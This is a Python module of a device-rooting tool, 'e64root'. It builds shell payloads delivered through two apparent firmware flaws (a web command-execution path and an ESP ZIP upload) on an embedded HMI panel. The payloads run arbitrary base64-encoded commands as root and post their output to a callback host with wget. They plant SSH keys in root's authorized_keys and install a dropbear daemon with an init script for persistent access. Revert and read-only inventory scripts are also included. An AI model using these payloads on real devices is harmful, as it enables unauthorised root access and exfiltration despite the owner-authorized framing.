"""Shell payloads, archive construction and remote-inventory helpers.

Every script here is generated locally and is printed by the CLI before it is
sent.  The scripts are intentionally boring: they write only the documented
dropbear/init/key files, keep a backup of anything they replace, and never
download code.
"""

from __future__ import annotations

import base64
import hashlib
import io
import re
import shlex
import zipfile
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Sequence

from .errors import UsageError
from .target import DaemonPlan, key_blob

INIT_MARKER = "managed by e64root"
KEY_BEGIN = "# e64root begin"
KEY_END = "# e64root end"
RESULT_FILE = "/root/e64root_result"
MANIFEST = "/root/.e64root/manifest"
BACKUP_DIR = "/root/.e64root/backup"
LAST_OUTPUT = "/tmp/e64root-last.out"
DEFAULT_INIT_DROPBEAR = "/etc/init.d/S85dropbear"
DEFAULT_INIT_SSHD = "/etc/init.d/S85sshd"
MAX_COMMAND_BYTES = 65536
MAX_SCRIPT_BYTES = 1024 * 1024


def _b64(text: str) -> str:
    return base64.b64encode(text.encode("utf-8")).decode("ascii")


def _now() -> str:
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


def _validate_script(text: str) -> str:
    if not text.strip():
        raise UsageError("refusing to build an empty payload")
    if "\x00" in text:
        raise UsageError("payload contains a NUL byte")
    if len(text.encode("utf-8")) > MAX_SCRIPT_BYTES:
        raise UsageError(f"payload is larger than {MAX_SCRIPT_BYTES} bytes")
    return text


def _watchdog(timeout: int, cleanup: str = "") -> str:
    if timeout < 1 or timeout > 3600:
        raise UsageError("command timeout must be between 1 and 3600 seconds")
    exit_cleanup = f"kill \"$e64root_watchdog\" 2>/dev/null; {cleanup}".rstrip("; ")
    term_cleanup = (
        f"kill \"$e64root_watchdog\" 2>/dev/null; {cleanup + '; ' if cleanup else ''}exit 124"
    )
    return (
        f"( sleep {timeout}; kill -TERM $$ 2>/dev/null ) &\n"
        "e64root_watchdog=$!\n"
        f"trap '{term_cleanup}' TERM INT HUP\n"
        f"trap '{exit_cleanup}' EXIT\n"
    )


def _callback_url(value: str) -> str:
    if not re.fullmatch(r"http://[A-Za-z0-9._:\[\]-]+/e64root/[A-Za-z0-9_-]+", value):
        raise UsageError(f"unsafe callback URL: {value!r}")
    return value


def _callback_block(url: str) -> str:
    url = _callback_url(url)
    quoted = shlex.quote(url)
    return (
        "if command -v wget >/dev/null 2>&1; then\n"
        "  http_proxy= HTTP_PROXY= wget -q -O /dev/null "
        f"--post-file {LAST_OUTPUT} {quoted} || true\n"
        "elif [ -x /bin/busybox ]; then\n"
        "  http_proxy= HTTP_PROXY= /bin/busybox wget -q -O /dev/null "
        f"--post-file {LAST_OUTPUT} {quoted} || true\n"
        "fi\n"
    )


def _command_body(
    command: str,
    timeout: int,
    callback_url: str,
    *,
    prelude: str = "",
    cleanup: str = "",
    epilogue: str = "",
) -> str:
    if not command.strip():
        raise UsageError("refusing to run an empty command")
    if len(command.encode("utf-8")) > MAX_COMMAND_BYTES:
        raise UsageError(f"command is larger than {MAX_COMMAND_BYTES} bytes")
    if "\x00" in command:
        raise UsageError("command contains a NUL byte")
    return (
        "#!/bin/sh\n"
        "# e64root command payload (generated locally; owner-authorized use only)\n"
        + (prelude.rstrip("\n") + "\n" if prelude else "")
        + "set -u\n"
        "umask 077\n"
        "mount -o remount,rw / 2>/dev/null || true\n"
        + _watchdog(timeout, cleanup)
        + f"echo '{_b64(command)}' | base64 -d > /tmp/e64root-cmd.sh\n"
        + f"sh /tmp/e64root-cmd.sh > {LAST_OUTPUT} 2>&1\n"
        "e64root_rc=$?\n"
        + f"id >> {LAST_OUTPUT}\n"
        + _callback_block(callback_url)
        + (epilogue.rstrip("\n") + "\n" if epilogue else "")
        + "kill \"$e64root_watchdog\" 2>/dev/null || true\n"
        + "trap - EXIT HUP INT TERM\n"
        + "echo \"e64root rc=$e64root_rc\"\n"
        + "exit \"$e64root_rc\"\n"
    )


def web_script(command: str, callback_url: str, timeout: int = 20) -> str:
    """Script executed through FW-01; output and ``id`` are posted back."""
    return _validate_script(_command_body(command, timeout, callback_url))


def esp_script(command: str, callback_url: str, timeout: int = 20) -> str:
    """``do_flash.sh`` executed by the ESP archive path (FW-02).

    The first action restores the ESP boot pins, because ``flashEspZip.sh``
    pulses them before invoking the archive.  The trap restores them again on
    every exit path.  Nothing here opens ``/dev/ttySTM5`` or writes ESP flash.
    """
    restore = r"""restore_esp() {
  if [ -x /usr/local/bin/unsetEspBootmode.sh ]; then
    /usr/local/bin/unsetEspBootmode.sh >/dev/null 2>&1 || true
  fi
  # The vendor helper is the same sequence; repeat it inline so a missing
  # helper cannot leave the ESP held in reset/download mode.
  if [ -d /sys/class/gpio/gpio60 ]; then
    echo 0 > /sys/class/gpio/gpio60/value 2>/dev/null || true
  fi
  if [ -d /sys/class/gpio/gpio59 ]; then
    echo 1 > /sys/class/gpio/gpio59/value 2>/dev/null || true
  fi
  if [ -d /sys/class/gpio/gpio60 ]; then
    echo 1 > /sys/class/gpio/gpio60/value 2>/dev/null || true
  fi
}
restore_esp
"""
    return _validate_script(
        "#!/bin/sh\n"
        "# e64root ESP payload (generated locally; owner-authorized use only)\n"
        + restore
        + _command_body(
            command,
            timeout,
            callback_url,
            cleanup="restore_esp",
            epilogue="restore_esp",
        ).split("\n", 2)[2]
    )


def install_init_script(plan: DaemonPlan, port: int) -> str:
    if not 1 <= port <= 65535:
        raise UsageError("SSH port must be between 1 and 65535")
    if plan.kind == "dropbear":
        return f"""#!/bin/sh
# {INIT_MARKER}; remove with: e64root revert --yes
case "$1" in
  start)
    mkdir -p /etc/dropbear /run
    start-stop-daemon -S -q -b -x {plan.remote_path} -- -R -p {port}
    ;;
  stop)
    start-stop-daemon -K -q -x {plan.remote_path}
    ;;
  restart)
    "$0" stop
    sleep 1
    "$0" start
    ;;
esac
exit 0
"""
    return f"""#!/bin/sh
# {INIT_MARKER}; remove with: e64root revert --yes
# sshd needs pre-existing host keys and configuration on this image.
case "$1" in
  start)
    mkdir -p /run
    start-stop-daemon -S -q -b -x {plan.remote_path} -- -p {port}
    ;;
  stop)
    start-stop-daemon -K -q -x {plan.remote_path}
    ;;
  restart)
    "$0" stop
    sleep 1
    "$0" start
    ;;
esac
exit 0
"""


def install_script(
    pubkeys: Sequence[str],
    plan: DaemonPlan,
    port: int = 22,
) -> str:
    """Build the root installer used by both ``ssh --via web`` and ``--via esp``."""
    if not pubkeys:
        raise UsageError("at least one public key is required")
    init_path = DEFAULT_INIT_DROPBEAR if plan.kind == "dropbear" else DEFAULT_INIT_SSHD
    init = install_init_script(plan, port)
    init_hash = hashlib.sha256(init.encode()).hexdigest()
    keys = "\n".join(pubkeys)
    blobs = ",".join(key_blob(key) for key in pubkeys)
    upload = plan.needs_upload
    drop_hash = hashlib.sha256(plan.binary).hexdigest() if plan.binary else ""

    upload_block = ""
    if upload:
        upload_block = f"""
# The binary was streamed to /tmp/e64root-dropbear by the transport in
# bounded chunks.  On the ESP path it arrives next to do_flash.sh, so copy it
# into the same temporary location first.
if [ ! -f /tmp/e64root-dropbear ] && [ -f "$(dirname "$0")/dropbear" ]; then
  cp "$(dirname "$0")/dropbear" /tmp/e64root-dropbear
fi
if [ ! -f /tmp/e64root-dropbear ]; then
  echo "e64root: uploaded binary is missing" >&2
  exit 11
fi
got=$(sha256sum /tmp/e64root-dropbear | cut -d' ' -f1)
if [ "$got" != "{drop_hash}" ]; then
  echo "e64root: uploaded binary digest mismatch ($got)" >&2
  exit 12
fi
if [ -f {plan.remote_path} ] && [ ! -e {BACKUP_DIR}/dropbear ]; then
  # Preserve whatever was there, even if it happens to have the same digest,
  # so revert can put the original file back rather than deleting it.
  cp -p {plan.remote_path} {BACKUP_DIR}/dropbear
fi
install -m 0755 /tmp/e64root-dropbear {plan.remote_path}
rm -f /tmp/e64root-dropbear
"""
    else:
        upload_block = f"""
if [ ! -x {plan.remote_path} ]; then
  echo "e64root: {plan.remote_path} is not executable" >&2
  exit 13
fi
"""

    return _validate_script(
        f"""#!/bin/sh
# e64root installer (generated locally; owner-authorized use only)
# Target: HEM-HSG-HMI-S01 / NG2 vendor userspace.
# This script only writes the documented dropbear/init/key files and keeps a
# backup of anything it replaces.
set -eu
umask 077
mount -o remount,rw / 2>/dev/null || true
mkdir -p /root/.ssh /etc/dropbear /run {BACKUP_DIR}

# Preserve the shipped/vendor authorized_keys exactly once.
if [ -f /root/.ssh/authorized_keys ] && [ ! -e {BACKUP_DIR}/authorized_keys ]; then
  cp -p /root/.ssh/authorized_keys {BACKUP_DIR}/authorized_keys
fi

# Preserve a pre-existing init script that is not ours.
if [ -f {init_path} ] && [ ! -e {BACKUP_DIR}/init ] && ! grep -q '{INIT_MARKER}' {init_path}; then
  cp -p {init_path} {BACKUP_DIR}/init
fi

# Remove only our own key block, then append the requested key(s).
if [ -f /root/.ssh/authorized_keys ]; then
  awk '/^{KEY_BEGIN}$/{{skip=1;next}} /^{KEY_END}$/{{skip=0;next}} !skip' \
    /root/.ssh/authorized_keys > /tmp/e64root.authorized_keys
  cat /tmp/e64root.authorized_keys > /root/.ssh/authorized_keys
  rm -f /tmp/e64root.authorized_keys
fi
{{
  echo '{KEY_BEGIN}'
  cat <<'E64ROOT_KEY'
{keys}
E64ROOT_KEY
  echo '{KEY_END}'
}} >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

{upload_block}

cat > {init_path} <<'E64ROOT_INIT'
{init}E64ROOT_INIT
chmod 755 {init_path}
if [ -f {init_path} ]; then
  true
fi

cat > {MANIFEST} <<'E64ROOT_MANIFEST'
schema=1
installed_at={_now()}
daemon_kind={plan.kind}
daemon_path={plan.remote_path}
init_path={init_path}
init_sha256={init_hash}
dropbear_sha256={drop_hash}
port={port}
key_blobs={blobs}
E64ROOT_MANIFEST
chmod 600 {MANIFEST}

# Start only if the daemon is not already running.
if ! (pidof {plan.kind} >/dev/null 2>&1 || pgrep -x {plan.kind} >/dev/null 2>&1); then
  {init_path} start || true
fi

{{
  echo 'e64root installer complete'
  id
  echo "init={init_path}"
  echo "daemon={plan.remote_path}"
}} > {RESULT_FILE}
chmod 600 {RESULT_FILE}
echo 'e64root install ok'
"""
    )


def verify_script(pubkeys: Sequence[str]) -> str:
    blobs = [key_blob(key) for key in pubkeys]
    checks = "\n".join(
        f"echo \"key_present_{index}=$(grep -Fc '{blob}' /root/.ssh/authorized_keys 2>/dev/null || true)\""
        for index, blob in enumerate(blobs, start=1)
    )
    return _validate_script(
        f"""#!/bin/sh
# e64root read-only verification (generated locally)
set -u
emit() {{ printf '%s=%s\\n' "$1" "$2"; }}
emit uid "$(id -u 2>/dev/null || echo unknown)"
emit user "$(id -un 2>/dev/null || echo unknown)"
emit kernel "$(uname -r 2>/dev/null || echo unknown)"
emit dropbear_present "$(test -x /usr/sbin/dropbear && echo yes || echo no)"
emit dropbear_sha256 "$(sha256sum /usr/sbin/dropbear 2>/dev/null | cut -d' ' -f1)"
emit dropbear_pid "$(pidof dropbear 2>/dev/null || true)"
emit sshd_present "$(test -x /usr/sbin/sshd && echo yes || echo no)"
emit init_present "$(test -f /etc/init.d/S85dropbear && echo yes || echo no)"
emit init_managed "$(grep -c '{INIT_MARKER}' /etc/init.d/S85dropbear 2>/dev/null || true)"
emit init_sshd_present "$(test -f /etc/init.d/S85sshd && echo yes || echo no)"
emit init_sshd_managed "$(grep -c '{INIT_MARKER}' /etc/init.d/S85sshd 2>/dev/null || true)"
emit manifest_present "$(test -f {MANIFEST} && echo yes || echo no)"
emit result_present "$(test -f {RESULT_FILE} && echo yes || echo no)"
emit authorized_keys_sha256 "$(sha256sum /root/.ssh/authorized_keys 2>/dev/null | cut -d' ' -f1)"
emit key_block "$(grep -c '^{KEY_BEGIN}$' /root/.ssh/authorized_keys 2>/dev/null || true)"
{checks}
emit issue_b64 "$(base64 /etc/issue 2>/dev/null | tr -d '\\n')"
emit log_stat "$(stat -c '%a %U %G' /log 2>/dev/null || echo missing)"
emit log_www_writable "$(sudo -u www-data sh -c 'test -w /log' >/dev/null 2>&1 && echo yes || echo no)"
emit tty_stm5 "$(test -e /dev/ttySTM5 && echo yes || echo no)"
emit flash_script "$(test -x /usr/local/bin/flashEspZip.sh && echo yes || echo no)"
emit root_mount "$(grep ' / ' /proc/mounts 2>/dev/null | cut -d' ' -f4)"
emit uptime "$(cut -d' ' -f1 /proc/uptime 2>/dev/null || echo unknown)"
"""
    )


def inventory_script(pubkeys: Sequence[str] | None = None) -> str:
    blobs = [key_blob(key) for key in (pubkeys or [])]
    checks = "\n".join(
        f"echo \"key_present_{index}=$(grep -Fc '{blob}' /root/.ssh/authorized_keys 2>/dev/null || true)\""
        for index, blob in enumerate(blobs, start=1)
    )
    return _validate_script(
        f"""#!/bin/sh
# e64root read-only inventory for revert (generated locally)
set -u
emit() {{ printf '%s=%s\\n' "$1" "$2"; }}
emit uid "$(id -u 2>/dev/null || echo unknown)"
emit manifest_present "$(test -f {MANIFEST} && echo yes || echo no)"
emit init_present "$(test -f /etc/init.d/S85dropbear && echo yes || echo no)"
emit init_managed "$(grep -c '{INIT_MARKER}' /etc/init.d/S85dropbear 2>/dev/null || true)"
emit init_sshd_present "$(test -f /etc/init.d/S85sshd && echo yes || echo no)"
emit init_sshd_managed "$(grep -c '{INIT_MARKER}' /etc/init.d/S85sshd 2>/dev/null || true)"
emit dropbear_present "$(test -f /usr/sbin/dropbear && echo yes || echo no)"
emit dropbear_sha256 "$(sha256sum /usr/sbin/dropbear 2>/dev/null | cut -d' ' -f1)"
emit authorized_keys_sha256 "$(sha256sum /root/.ssh/authorized_keys 2>/dev/null | cut -d' ' -f1)"
emit key_block "$(grep -c '^{KEY_BEGIN}$' /root/.ssh/authorized_keys 2>/dev/null || true)"
emit backup_keys "$(test -f {BACKUP_DIR}/authorized_keys && echo yes || echo no)"
emit backup_init "$(test -f {BACKUP_DIR}/init && echo yes || echo no)"
emit backup_dropbear "$(test -f {BACKUP_DIR}/dropbear && echo yes || echo no)"
{checks}
"""
    )


def preflight_script() -> str:
    """Read-only checks for the FW-02 preconditions, run through FW-01 or SSH."""
    return _validate_script(
        r"""#!/bin/sh
# e64root FW-02 precondition check (read-only)
set -u
emit() { printf '%s=%s\n' "$1" "$2"; }
emit uid "$(id -u 2>/dev/null || echo unknown)"
emit log_stat "$(stat -c '%a %U %G' /log 2>/dev/null || echo missing)"
emit log_www_writable "$(sudo -u www-data sh -c 'test -w /log' >/dev/null 2>&1 && echo yes || echo no)"
emit tty_stm5 "$(test -e /dev/ttySTM5 && echo yes || echo no)"
emit flash_script "$(test -x /usr/local/bin/flashEspZip.sh && echo yes || echo no)"
emit set_bootmode "$(test -x /usr/local/bin/setEspBootmode.sh && echo yes || echo no)"
emit unset_bootmode "$(test -x /usr/local/bin/unsetEspBootmode.sh && echo yes || echo no)"
emit unzip "$(command -v unzip >/dev/null 2>&1 && echo yes || echo no)"
emit sudo "$(command -v sudo >/dev/null 2>&1 && echo yes || echo no)"
emit wget "$(command -v wget >/dev/null 2>&1 && echo yes || echo no)"
emit authorized_keys_sha256 "$(sha256sum /root/.ssh/authorized_keys 2>/dev/null | cut -d' ' -f1)"
"""
    )


def clock_script() -> str:
    return _validate_script(
        "#!/bin/sh\nset -u\necho \"epoch=$(date +%s 2>/dev/null || echo 0)\"\n"
        "echo \"date=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)\"\n"
    )


def revert_script(
    pubkeys: Sequence[str] | None = None,
    purge_backups: bool = False,
    keep_daemon: bool = False,
) -> str:
    blobs = [key_blob(key) for key in (pubkeys or [])]
    exact_removal = ""
    has_exact = "0"
    if blobs:
        # Remove only lines whose key blob matches, when no e64root block is
        # present.  Other authorized keys are preserved.
        awk_vars = " ".join(
            f"-v b{index}={shlex.quote(blob)}" for index, blob in enumerate(blobs, start=1)
        )
        conditions = " && ".join(
            f"$2 != b{index}" for index in range(1, len(blobs) + 1)
        )
        exact_removal = (
            f"awk {awk_vars} '({conditions})' /root/.ssh/authorized_keys "
            "> /tmp/e64root.ak && cat /tmp/e64root.ak > /root/.ssh/authorized_keys\n"
            "  rm -f /tmp/e64root.ak"
        )
        has_exact = "1"
    purge = "rm -rf /root/.e64root" if purge_backups else "true"
    stop = (
        "true"
        if keep_daemon
        else r"""
# Stop only the daemon at the exact path we managed, and do it after the
# response has had a chance to leave the box.  A running SSH session is cut.
(
  sleep 1
  if [ -n "${daemon_path:-}" ]; then
    start-stop-daemon -K -q -x "$daemon_path" 2>/dev/null || true
  fi
) >/dev/null 2>&1 &
"""
    )
    return _validate_script(
        f"""#!/bin/sh
# e64root revert (generated locally; dry-run is the default in the CLI)
set -u
mount -o remount,rw / 2>/dev/null || true
manifest={MANIFEST}
daemon_path=/usr/sbin/dropbear
init_path={DEFAULT_INIT_DROPBEAR}
drop_hash=
key_blobs=
port=22
if [ -f "$manifest" ]; then
  daemon_path=$(sed -n 's/^daemon_path=//p' "$manifest" | head -n 1)
  init_path=$(sed -n 's/^init_path=//p' "$manifest" | head -n 1)
  drop_hash=$(sed -n 's/^dropbear_sha256=//p' "$manifest" | head -n 1)
  key_blobs=$(sed -n 's/^key_blobs=//p' "$manifest" | head -n 1)
  port=$(sed -n 's/^port=//p' "$manifest" | head -n 1)
fi
[ -n "$daemon_path" ] || daemon_path=/usr/sbin/dropbear
[ -n "$init_path" ] || init_path={DEFAULT_INIT_DROPBEAR}
if [ ! -f "$manifest" ] && [ -f {DEFAULT_INIT_SSHD} ] && grep -q '{INIT_MARKER}' {DEFAULT_INIT_SSHD}; then
  init_path={DEFAULT_INIT_SSHD}
fi

if [ -f /root/.ssh/authorized_keys ] && grep -q '^{KEY_BEGIN}$' /root/.ssh/authorized_keys; then
  awk '/^{KEY_BEGIN}$/{{skip=1;next}} /^{KEY_END}$/{{skip=0;next}} !skip' \
    /root/.ssh/authorized_keys > /tmp/e64root.authorized_keys
  cat /tmp/e64root.authorized_keys > /root/.ssh/authorized_keys
  rm -f /tmp/e64root.authorized_keys
  echo "revert=key-block-removed"
elif [ -f /root/.ssh/authorized_keys ] && [ "{has_exact}" = "1" ]; then
  {exact_removal if exact_removal else "true"}
  echo "revert=exact-keys-removed"
else
  echo "revert=no-e64root-key-block"
fi

# Do NOT copy the authorized_keys backup over the live file: the installer
# appended a block rather than replacing the file, so removing that block is
# sufficient.  Restoring the backup would also discard keys added later.

current_hash=$(sha256sum "$daemon_path" 2>/dev/null | cut -d' ' -f1)
if [ -f {BACKUP_DIR}/dropbear ]; then
  cp -p {BACKUP_DIR}/dropbear "$daemon_path"
  chmod 755 "$daemon_path"
  echo "revert=dropbear-restored-from-backup"
elif [ -n "$drop_hash" ] && [ "$current_hash" = "$drop_hash" ]; then
  rm -f "$daemon_path"
  echo "revert=dropbear-removed"
elif [ -n "$current_hash" ]; then
  echo "revert=dropbear-kept-not-ours"
else
  echo "revert=dropbear-absent"
fi

if [ -f {BACKUP_DIR}/init ]; then
  cp -p {BACKUP_DIR}/init "$init_path"
  chmod 755 "$init_path"
  echo "revert=init-restored-from-backup"
elif [ -f "$init_path" ] && grep -q '{INIT_MARKER}' "$init_path"; then
  rm -f "$init_path"
  echo "revert=init-removed"
else
  echo "revert=init-kept-not-ours"
fi

rm -f {RESULT_FILE}
rm -f /tmp/e64root-web.sh /tmp/e64root-web.b64 /tmp/e64root-cmd.sh /tmp/e64root.authorized_keys /tmp/e64root-dropbear /tmp/e64root-dropbear.b64 /tmp/e64root-last.out
rm -f /usr/local/www/e64root-*.out
rm -f "$manifest"
{purge}
echo "revert=done"
{stop}
"""
    )


# --- archives ---------------------------------------------------------------

@dataclass(frozen=True)
class ArchiveMember:
    name: str
    size: int
    executable: bool


def esp_zip(script: str, binary: bytes | None = None) -> bytes:
    """Build the single-directory ZIP expected by ``upload_esp.php``.

    ``cd /tmp/esp/*`` expands all top-level entries.  The archive therefore has
    exactly one top-level directory (``payload/``) containing ``do_flash.sh``
    and, when needed, the static dropbear.
    """
    _validate_script(script)
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        _writestr(archive, "payload/do_flash.sh", script.encode(), 0o100755)
        if binary is not None:
            if not binary:
                raise UsageError("refusing to add an empty dropbear to the archive")
            _writestr(archive, "payload/dropbear", binary, 0o100755)
    return buffer.getvalue()


def _writestr(archive: zipfile.ZipFile, name: str, data: bytes, mode: int) -> None:
    info = zipfile.ZipInfo(name, date_time=(1980, 1, 1, 0, 0, 0))
    info.compress_type = zipfile.ZIP_DEFLATED
    info.external_attr = mode << 16
    info.create_system = 3
    archive.writestr(info, data)


def inspect_zip(payload: bytes) -> list[ArchiveMember]:
    with zipfile.ZipFile(io.BytesIO(payload)) as archive:
        members = []
        for info in archive.infolist():
            if info.filename.startswith("/") or ".." in info.filename.split("/"):
                raise UsageError(f"unsafe archive member: {info.filename}")
            members.append(
                ArchiveMember(
                    name=info.filename,
                    size=info.file_size,
                    executable=bool((info.external_attr >> 16) & 0o111),
                )
            )
        return members


def zip_top_level(payload: bytes) -> list[str]:
    names = [member.name for member in inspect_zip(payload)]
    return sorted({name.split("/", 1)[0] for name in names if name})


def sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def printable_script(script: str) -> str:
    """A copy suitable for ``--dry-run`` output."""
    return script.rstrip("\n") + "\n"


def capture_script(script: str, callback_url: str) -> str:
    """Run a read-only script and post its stdout back to the owner host."""
    return _validate_script(
        "#!/bin/sh\n"
        "# e64root capture wrapper (generated locally)\n"
        "set -u\n"
        "umask 077\n"
        f"echo '{_b64(script)}' | base64 -d > /tmp/e64root-inner.sh\n"
        f"sh /tmp/e64root-inner.sh > {LAST_OUTPUT} 2>&1\n"
        + _callback_block(callback_url)
        + "rm -f /tmp/e64root-inner.sh\n"
    )

